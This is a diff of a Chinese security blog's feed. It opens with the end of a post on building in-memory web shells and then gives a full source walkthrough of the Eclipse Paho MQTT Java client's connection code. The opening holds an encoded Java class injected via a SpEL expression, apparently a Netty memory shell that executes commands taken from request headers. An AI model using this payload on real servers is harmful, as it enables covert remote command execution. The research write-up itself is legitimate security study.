BBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAF0BAAD7AIX4AAVCBwBeAwABAF8AYAACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABhAGIAAQAAABwAYwBkAAIAAAAcAGUAZgADAAgAFABnAGgABABpAAAADQMAYQAAAGMAAABlAAAAAQBqAGsAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGwAWQAEAEMACwBtAFkABQBTAAUAVgBXAAQADABMAG4AbwADAAAAYQBFAEYAAAAAAGEAcABxAAEAAABhAFgATAACAFoAAAAPAAP8AE4HAHJCBwBe+gAGAHMAAAAEAAEAGwBpAAAACQIAcAAAAFgAAAACAHQAdQACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBwAHEAAQAAADYAdgBZAAIAAAA2AHcAeAADABQAIgB5AHoABABpAAAADQMAcAAAAHYAAAB3AAAAAQB7AAAAAgB8'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
+}
+
+
+</code></pre>
+<p>最后成果</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210151806764.png" alt="image-20220929095029422" loading="lazy"></figure>
+<h3 id="总结">总结</h3>
+<p>最后还是要用<strong>c0ny1</strong> 师傅的一句话：</p>
+<p>关于各个协议和组件的内存马的构造思路其实都大同小异，说白了就是分析涉及处理请求的对象，阅读它的源码看看是否能获取请求内容，同时能否控制响应内容。然后分析该对象是如何被注册到内存当中的，最后我们只要模拟下这个过程即可。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[MQTT协议-Eclipse Paho Java Client源码分析（二）]]></title>
+        <id>https://liangyueliangyue.github.io/post/mqtt-xie-yi-eclipse-paho-java-client-yuan-ma-fen-xi-er/</id>
+        <link href="https://liangyueliangyue.github.io/post/mqtt-xie-yi-eclipse-paho-java-client-yuan-ma-fen-xi-er/">
+        </link>
+        <updated>2022-06-28T13:40:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="文章首发于跳跳糖httpstttangcomarchive1627">文章首发于跳跳糖：https://tttang.com/archive/1627/</h2>
+<p>前文讲到主要从五个点来进行源码学习</p>
+<ul>
+<li>连接broker</li>
+<li>创建主题</li>
+<li>发布主题内容</li>
+<li>订阅主题</li>
+<li>接收主题内容</li>
+</ul>
+<h2 id="连接broker">连接broker</h2>
+<p>上文写过的简单例子可以知道首先调用的是MqttClient的connect方法</p>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121633.png" alt="image-20220517140035502" loading="lazy"></figure>
+<p>而aClient是MqttAsyncClient所以调用的是MqttAsyncClient的connect方法，最终指向都是如下（代码太长就不贴图了）</p>
+<pre><code class="language-java">public IMqttToken connect(MqttConnectOptions options, Object userContext, IMqttActionListener callback) throws MqttException, MqttSecurityException {
+        if (this.comms.isConnected()) {
+            throw ExceptionHelper.createMqttException(32100);
+        } else if (this.comms.isConnecting()) {
+            throw new MqttException(32110);
+        } else if (this.comms.isDisconnecting()) {
+            throw new MqttException(32102);
+        } else if (this.comms.isClosed()) {
+            throw new MqttException(32111);
+        } else {
+            if (options == null) {
+                options = new MqttConnectOptions();
+            }
+
+            this.connOpts = options;
+            this.userContext = userContext;
+            boolean automaticReconnect = options.isAutomaticReconnect();
+            log.fine(CLASS_NAME, &quot;connect&quot;, &quot;103&quot;, new Object[]{options.isCleanSession(), new Integer(options.getConnectionTimeout()), new Integer(options.getKeepAliveInterval()), options.getUserName(), options.getPassword() == null ? &quot;[null]&quot; : &quot;[notnull]&quot;, options.getWillMessage() == null ? &quot;[null]&quot; : &quot;[notnull]&quot;, userContext, callback});
+            this.comms.setNetworkModules(this.createNetworkModules(this.serverURI, options));
+            this.comms.setReconnectCallback(new MqttAsyncClient.MqttReconnectCallback(automaticReconnect));
+            MqttToken userToken = new MqttToken(this.getClientId());
+            ConnectActionListener connectActionListener = new ConnectActionListener(this, this.persistence, this.comms, options, userToken, userContext, callback, this.reconnecting);
+            userToken.setActionCallback(connectActionListener);
+            userToken.setUserContext(this);
+            if (this.mqttCallback instanceof MqttCallbackExtended) {
+                connectActionListener.setMqttCallbackExtended((MqttCallbackExtended)this.mqttCallback);
+            }
+
+            this.comms.setNetworkModuleIndex(0);
+            connectActionListener.connect();
+            return userToken;
+        }
+    }
+</code></pre>
+<p>首先调用了MqttAsyncClient中创建的ClientComms对象中isConnected、isConnecting、isDisconnecting、isClosed四个方法（这样的方法存在6个）</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121634.png" alt="image-20220517141018924" loading="lazy"></figure>
+<p>通过conState的值去判断Clinet当前的状态，如果是连接中，正在连接，正在断开，关闭这几个状态就会进入异常处理</p>
+<figure data-type="image" tabindex="3"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121635.png" alt="image-20220517141059088" loading="lazy"></figure>
+<p>也就是正常连接时ClientComms.conState应该为3</p>
+<figure data-type="image" tabindex="4"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121636.png" alt="image-20220517142838058" loading="lazy"></figure>
+<p>再往下判断options是否为null，如果为null会创建一个MqttConnectOptions对象，下面就会用到</p>
+<p>之后再调用MqttConnectOptions#isAutomaticReconnect，返回automaticReconnect，默认为false</p>
+<pre><code class="language-java">private boolean automaticReconnect = false;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121637.png" alt="image-20220517143241060" loading="lazy"></figure>
+<p>这个标志位的作用就是客户端断开是否会自动尝试重新连接，默认不进行重连</p>
+<h3 id="networkmodules">NetworkModules</h3>
+<p>首先是MqttAsyncClient#createNetworkModules方法来创建NetworkModule对象</p>
+<pre><code class="language-java">protected NetworkModule[] createNetworkModules(String address, MqttConnectOptions options)
+			throws MqttException, MqttSecurityException {
+		final String methodName = &quot;createNetworkModules&quot;;
+		// @TRACE 116=URI={0}
+		log.fine(CLASS_NAME, methodName, &quot;116&quot;, new Object[] { address });
+
+		NetworkModule[] networkModules = null;
+		String[] serverURIs = options.getServerURIs();
+		String[] array = null;
+		if (serverURIs == null) {
+			array = new String[] { address };
+		} else if (serverURIs.length == 0) {
+			array = new String[] { address };
+		} else {
+			array = serverURIs;
+		}
+
+		networkModules = new NetworkModule[array.length];
+		for (int i = 0; i &lt; array.length; i++) {
+			networkModules[i] = createNetworkModule(array[i], options);
+		}
+
+		log.fine(CLASS_NAME, methodName, &quot;108&quot;);
+		return networkModules;
+	}
+
+</code></pre>
+<p>尝试从MqttConnectOptions中获取serverURL，如果获取不到会使用传入的serverURL，然后new 了一个实现NetworkModule接口的对象</p>
+<figure data-type="image" tabindex="6"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202205241121638.png" alt="image-20220517144523202" loading="lazy"></figure>
+<p>通过循环将serverURL数组中的值调用createNetworkModule然后存入networkModules返回。</p>
+<p>看下createNetworkModule</p>
+<pre><code class="language-java">private NetworkModule createNetworkModule(String address, MqttConnectOptions options) throws MqttException, MqttSecurityException {
+		final String methodName = &quot;createNetworkModule&quot;;
+		// @TRACE 115=URI={0}
+		log.fine(CLASS_NAME,methodName, &quot;115&quot;, new Object[] {address});
+
+		NetworkModule netModule;
+		SocketFactory factory = options.getSocketFactory();
+
+		int serverURIType = MqttConnectOptions.validateURI(address);
+
+		URI uri;
+		try {
+			uri = new URI(address);
+			// If the returned uri contains no host and the address contains underscores,
+			// then it's likely that Java did not parse the URI
+			if(uri.getHost() == null &amp;&amp; address.contains(&quot;_&quot;)){
+				try {
+					final Field hostField = URI.class.getDeclaredField(&quot;host&quot;);
+					hostField.setAccessible(true);
+					// Get everything after the scheme://
+					String shortAddress = address.substring(uri.getScheme().length() + 3);
+					hostField.set(uri, getHostName(shortAddress));
+					
+				} catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException e) {
+					throw ExceptionHelper.createMqttException(e.getCause());
+				} 
+				
+			}
+		} catch (URISyntaxException e) {
+			throw new IllegalArgumentException(&quot;Malformed URI: &quot; + address + &quot;, &quot; + e.getMessage());
+		}
+
+		String host = uri.getHost();
+		int port = uri.getPort(); // -1 if not defined
+
+		switch (serverURIType) {
+		case MqttConnectOptions.URI_TYPE_TCP :
+			if (port == -1) {
+				port = 1883;
+			}
+			if (factory == null) {
+				factory = SocketFactory.getDefault();
+			}
+			else if (factory instanceof SSLSocketFactory) {
+				throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH);
+			}
+			netModule = new TCPNetworkModule(factory, host, port, clientId);
+			((TCPNetworkModule)netModule).setConnectTimeout(options.getConnectionTimeout());
+			break;
+		case MqttConnectOptions.URI_TYPE_SSL:
+			if (port == -1) {
+				port = 8883;
+			}
+			SSLSocketFactoryFactory factoryFactory = null;
+			if (factory == null) {
+//				try {
+					factoryFactory = new SSLSocketFactoryFactory();
+					Properties sslClientProps = options.getSSLProperties();
+					if (null != sslClientProps)
+						factoryFactory.initialize(sslClientProps, null);
+					factory = factoryFactory.createSocketFactory(null);
+//				}
+//				catch (MqttDirectException ex) {
+//					throw ExceptionHelper.createMqttException(ex.getCause());
+//				}
+			}
+			else if ((factory instanceof SSLSocketFactory) == false) {
+				throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH);
+			}
+
+			// Create the network module...
+			netModule = new SSLNetworkModule((SSLSocketFactory) factory, host, port, clientId);
+			((SSLNetworkModule)netModule).setSSLhandshakeTimeout(options.getConnectionTimeout());
+			((SSLNetworkModule)netModule).setSSLHostnameVerifier(options.getSSLHostnameVerifier());
+			// Ciphers suites need to be set, if they are available
+			if (factoryFactory != null) {
+				String[] enabledCiphers = factoryFactory.getEnabledCipherSuites(null);
+				if (enabledCiphers != null) {
+					((SSLNetworkModule) netModule).setEnabledCiphers(enabledCiphers);
+				}
+			}
+			break;
+		case MqttConnectOptions.URI_TYPE_WS:
+			if (port == -1) {
+				port = 80;
+			}
+			if (factory == null) {
+				factory = SocketFactory.getDefault();
+			}
+			else if (factory instanceof SSLSocketFactory) {
+				throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH);
+			}
+			netModule = new WebSocketNetworkModule(factory, address, host, port, clientId);
+			((WebSocketNetworkModule)netModule).setConnectTimeout(options.getConnectionTimeout());
+			break;
+		case MqttConnectOptions.URI_TYPE_WSS:
+			if (port == -1) {
+				port = 443;
+			}
+			SSLSocketFactoryFactory wSSFactoryFactory = null;
+			if (factory == null) {
+				wSSFactoryFactory = new SSLSocketFactoryFactory();
+					Properties sslClientProps = options.getSSLProperties();
+					if (null != sslClientProps)
+						wSSFactoryFactory.initialize(sslClientProps, null);
+					factory = wSSFactoryFactory.createSocketFactory(null);
+
+			}
+			else if ((factory instanceof SSLSocketFactory) == false) {
+				throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH);
+			}
+
+			// Create the network module...
+			netModule = new WebSocketSecureNetworkModule((SSLSocketFactory) factory, address, host, port, clientId);
+			((WebSocketSecureNetworkModule)netModule).setSSLhandshakeTimeout(options.getConnectionTimeout());
+			// Ciphers suites need to be set, if they are available
+			if (wSSFactoryFactory != null) {
+				String[] enabledCiphers = wSSFactoryFactory.getEnabledCipherSuites(null);
+				if (enabledCiphers != null) {
+					((SSLNetworkModule) netModule).setEnabledCiphers(enabledCiphers);
+				}
+			}
+			break;
+		default:
+			// This shouldn't happen, as long as validateURI() has been called.
+			log.fine(CLASS_NAME,methodName, &quot;119&quot;, new Object[] {address});
+			netModule = null;
+		}
+		return netModule;
+	}
+</code></pre>
+<p>代码很多但是不难读，首先作用是工厂方法创建正确的网络模块。开始通过getSocketFactory获取工厂，默认为null，然后利用之前讲过的MqttConnectOptions#validateURI去判断serverURI的类型</p>
+<ul>
+<li>tcp-&gt;0</li>
+<li>ssl-&gt;1</li>
+<li>local-&gt;2</li>
+<li>ws-&gt;3</li>
+<li>wss-&gt;4</li>
+</ul>
+<p>然后创建URL对象</p>
+<ul>
+<li>如果address包含_或者URL对象获取Host失败，就会尝试利用反射已经MqttAsyncClient#getHostName方法去解析不正常的address</li>
+<li>正常就通过URL对象直接获取Host和Port</li>
+</ul>
+<p>在通过不同的serverURL类型来进入不同的处理，这里以tcp为例讲一下（ssl和wss会因为加密多一些步骤）</p>
+<p>首先如果port没有给出，会根据不同类型赋一个默认的值</p>
+<ul>
+<li>tcp-&gt;1883</li>
+<li>ssl-&gt;8883</li>
+<li>ws-&gt;80</li>
+<li>wss-&gt;443</li>
+</ul>
+<p>然后SocketFactory#getDefault返回环境默认套接字工厂的副本，在利用这个套接字去创建TCP的网络模块TCPNetworkModule对象去返回</p>
+<p>然后ClientComms#setNetworkModules获取到TCPNetworkModule并赋值给networkModules</p>
+<p>回到org.eclipse.paho.client.mqttv3.MqttAsyncClient#connect</p>
+<p>networkModules之后将automaticReconnect值作为参数传入（默认为false）创建MqttReconnectCallback对象，然后赋值给CommsCallback的reconnectInternalCallback参数</p>
+<h3 id="connectactionlistener">ConnectActionListener</h3>
+<p>通过ClientId创建了MqttToken，MqttToken是提供一种机制来跟踪异步操作的完成情况（这里不着重讲了）。</p>
+<p>再往下创建ConnectActionListener对象，用来处理 AsyncClient 到可用 URL 之一的连接。</p>
+<p>在创建客户端时作提供单一URL ，或者作为连接选项中的列表提供，尝试连接到列表中的每个 URL，直到连接尝试成功或尝试了所有 URL</p>
+<p>此类使用自己的 onSuccess 和 onFailure 回调，而不是用户提供的回调</p>
+<p>如果连接成功，则通知用户令牌并调用 用户的onSuccess 回调函数</p>
+<figure data-type="image" tabindex="7"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701254.png" alt="image-20220613145552470" loading="lazy"></figure>
+<p>如果连接失败，则尝试列表中的另一个 URL</p>
+<figure data-type="image" tabindex="8"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701256.png" alt="image-20220613145804411" loading="lazy"></figure>
+<p>如果已经没有URL则通知用户令牌并调用 onFailure 回调</p>
+<figure data-type="image" tabindex="9"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701257.png" alt="image-20220613145819629" loading="lazy"></figure>
+<p>回到org.eclipse.paho.client.mqttv3.MqttAsyncClient#connect</p>
+<p>调用了MqttToken#setActionCallback来将ConnectActionListener对象注册为侦听器以在操作完成时收到通知。</p>
+<p>再调用MqttToken#setUserContext上下文来存储MqttAsyncClient对象。</p>
+<p>后面是一个可选项</p>
+<pre><code class="language-java"> If we are using the MqttCallbackExtended, set it on the
+// connectActionListener
+if (this.mqttCallback instanceof MqttCallbackExtended) {
+			connectActionListener.setMqttCallbackExtended((MqttCallbackExtended) this.mqttCallback);
+		}
+</code></pre>
+<p>如果使用 MqttCallbackExtended，请将其设置在connectActionListener里，而MqttCallbackExtended是用来扩展<a href="https://www.eclipse.org/paho/files/javadoc/org/eclipse/paho/client/mqttv3/MqttCallback.html"><code>MqttCallback</code></a>以允许新的回调而不破坏现有应用程序的 API实现此接口的类可以在两种类型的客户端上注册：<a href="https://www.eclipse.org/paho/files/javadoc/org/eclipse/paho/client/mqttv3/IMqttClient.html#setCallback-org.eclipse.paho.client.mqttv3.MqttCallback-"><code>IMqttClient.setCallback(MqttCallback)</code></a> 和<a href="https://www.eclipse.org/paho/files/javadoc/org/eclipse/paho/client/mqttv3/IMqttAsyncClient.html#setCallback-org.eclipse.paho.client.mqttv3.MqttCallback-"><code>IMqttAsyncClient.setCallback(MqttCallback)</code></a></p>
+<p>之后ClientComms#setNetworkModuleIndex设置了网络模块的索引</p>
+<p>然后调用ConnectActionListener#connect（这里才是连接的开始），也就是上面创建的ConnectActionListener对象</p>
+<figure data-type="image" tabindex="10"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701258.png" alt="image-20220613150304274" loading="lazy"></figure>
+<p>MqttToken已经说过了，而org.eclipse.paho.client.mqttv3.MqttClientPersistence#open是用来初始化持久存储，在之前MqttClient类对象的创建里指定<a href="https://www.eclipse.org/paho/files/javadoc/org/eclipse/paho/client/mqttv3/MqttClient.html"><code>MqttClient</code></a>它将用于持久化 QoS 1 和 2 消息。</p>
+<p>之后是参数的配置1.是否会话维持2.设置MQTT版本</p>
+<p>然后调用了org.eclipse.paho.client.mqttv3.internal.ClientComms#connect，如果失败调用onFailure这里前文讲了</p>
+<figure data-type="image" tabindex="11"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701259.png" alt="image-20220613151142241" loading="lazy"></figure>
+<p>漆面是通过MqttConnectOptions传递进来的参数来创建MqttConnect对象，然后进行一些配置设置，基本上前文都涉及到了。</p>
+<h3 id="connectbg">ConnectBG</h3>
+<p>这里重点看一下连接的实现org.eclipse.paho.client.mqttv3.internal.ClientComms.ConnectBG#start</p>
+<p>ConnectBG是实现了Runnable的类，运行在线程池中</p>
+<figure data-type="image" tabindex="12"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701260.png" alt="image-20220613152411548" loading="lazy"></figure>
+<p>这里看一下线程体的run方法</p>
+<figure data-type="image" tabindex="13"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701261.png" alt="image-20220613152521599" loading="lazy"></figure>
+<p>首先看关键主题内容，启动网络模块，发起网络连接</p>
+<pre><code class="language-java">NetworkModule networkModule = networkModules[networkModuleIndex]; 
+networkModule.start(); 
+</code></pre>
+<p>进入到org.eclipse.paho.client.mqttv3.internal.NetworkModule#start</p>
+<p>四个实现类</p>
+<figure data-type="image" tabindex="14"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701262.png" alt="image-20220613152755964" loading="lazy"></figure>
+<p>这里我们进入TCP分析</p>
+<figure data-type="image" tabindex="15"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202206131701263.png" alt="image-20220613152818845" loading="lazy"></figure>
+<p>可以看到调用了socket去实现连接</p>
+<p>连接完成后，启动receiver和，负责从broker接收消息以及向broker发送消息，两个类都实现了Runnable的类，运行在线程池中，直接看run函数</p>
+<pre><code class="language-java">receiver = new CommsReceiver(clientComms, clientState, tokenStore, networkModule.getInputStream());
+receiver.start(&quot;MQTT Rec: &quot;+getClient().getClientId(), executorService);
+sender = new CommsSender(clientComms, clientState, tokenStore, networkModule.getOutputStream());   	 
+sender.start(&quot;MQTT Snd: &quot;+getClient().getClientId(), executorService); 
+</code></pre>
+<p>receiver收到消息后，响应消息的消息类型为MqttAck，由于CONACK数据包是MqttAck类型，且token不为null，故会执行clientState.notifyReceivedAck函数.</p>
+<pre><code class="language-java">public void run() {
+		recThread = Thread.currentThread();
+		recThread.setName(threadName);
+		final String methodName = &quot;run&quot;;
+		MqttToken token = null;
+
+		try {
+			runningSemaphore.acquire();
+		} catch (InterruptedException e) {
+			running = false;
+			return;
+		}
+
+		while (running &amp;&amp; (in != null)) {
+			try {
+				//@TRACE 852=network read message
+				log.fine(CLASS_NAME,methodName,&quot;852&quot;);
+				receiving = in.available() &gt; 0;
+				MqttWireMessage message = in.readMqttWireMessage();
+				receiving = false;
+
+				// instanceof checks if message is null
+				if (message instanceof MqttAck) {
+					token = tokenStore.getToken(message);
+					if (token!=null) {
+						synchronized (token) {
+							// Ensure the notify processing is done under a lock on the token
+							// This ensures that the send processing can complete  before the
+							// receive processing starts! ( request and ack and ack processing
+							// can occur before request processing is complete if not!
+							clientState.notifyReceivedAck((MqttAck)message);
+						}
+					} else if(message instanceof MqttPubRec || message instanceof MqttPubComp || message instanceof MqttPubAck) {
+						//This is an ack for a message we no longer have a ticket for.
+						//This probably means we already received this message and it's being send again
+						//because of timeouts, crashes, disconnects, restarts etc.
+						//It should be safe to ignore these unexpected messages.
+						log.fine(CLASS_NAME, methodName, &quot;857&quot;);
+					} else {
+						// It its an ack and there is no token then something is not right.
+						// An ack should always have a token assoicated with it.
+						throw new MqttException(MqttException.REASON_CODE_UNEXPECTED_ERROR);
+					}
+				} else {
+					if (message != null) {
+						// A new message has arrived
+						clientState.notifyReceivedMsg(message);
+					}
+				}
+			}
+			catch (MqttException ex) {
+				//@TRACE 856=Stopping, MQttException
+				log.fine(CLASS_NAME,methodName,&quot;856&quot;,null,ex);
+				running = false;
+				// Token maybe null but that is handled in shutdown
+				clientComms.shutdownConnection(token, ex);
+			}
+			catch (IOException ioe) {
+				//@TRACE 853=Stopping due to IOException
+				log.fine(CLASS_NAME,methodName,&quot;853&quot;);
+
+				running = false;
+				// An EOFException could be raised if the broker processes the
+				// DISCONNECT and ends the socket before we complete. As such,
+				// only shutdown the connection if we're not already shutting down.
+				if (!clientComms.isDisconnecting()) {
+					clientComms.shutdownConnection(token, new MqttException(MqttException.REASON_CODE_CONNECTION_LOST, ioe));
+				}
+			}
+			finally {
+				receiving = false;
+				runningSemaphore.release();
+			}
+		}
+
+		//@TRACE 854=&lt;
+		log.fine(CLASS_NAME,methodName,&quot;854&quot;);
+	}
+</code></pre>
+<p>notifyReceivedAck函数中，处理各种broker返回消息，而连接消息处理最后会到connected()连接完成的方法中，该方法设置连接完成状态以及开始发送心跳。</p>
+<pre><code class="language-java">protected void notifyReceivedMsg(MqttWireMessage message) throws MqttException {
+		final String methodName = &quot;notifyReceivedMsg&quot;;
+		this.lastInboundActivity = System.currentTimeMillis();
+
+		// @TRACE 651=received key={0} message={1}
+		log.fine(CLASS_NAME, methodName, &quot;651&quot;, new Object[] {
+				new Integer(message.getMessageId()), message });
+		
+		if (!quiescing) {
+			if (message instanceof MqttPublish) {
+				MqttPublish send = (MqttPublish) message;
+				switch (send.getMessage().getQos()) {
+				case 0:
+				case 1:
+					if (callback != null) {
+						callback.messageArrived(send);
+					}
+					break;
+				case 2:
+					persistence.put(getReceivedPersistenceKey(message),
+							(MqttPublish) message);
+					inboundQoS2.put(new Integer(send.getMessageId()), send);
+					this.send(new MqttPubRec(send), null);
+					break;
+
+				default:
+					//should NOT reach here
+				}
+			} else if (message instanceof MqttPubRel) {
+				MqttPublish sendMsg = (MqttPublish) inboundQoS2
+						.get(new Integer(message.getMessageId()));
+				if (sendMsg != null) {
+					if (callback != null) {
+						callback.messageArrived(sendMsg);
+					}
+				} else {
+					// Original publish has already been delivered.
+					MqttPubComp pubComp = new MqttPubComp(message
+							.getMessageId());
+					this.send(pubComp, null);
+				}
+			}
+		}
+	}
+</code></pre>
+<p>sender不断循环从clientState获取待发送的消息然后通过org.eclipse.paho.client.mqttv3.internal.ClientState#notifySent将 MQTT连接的消息发送出去</p>
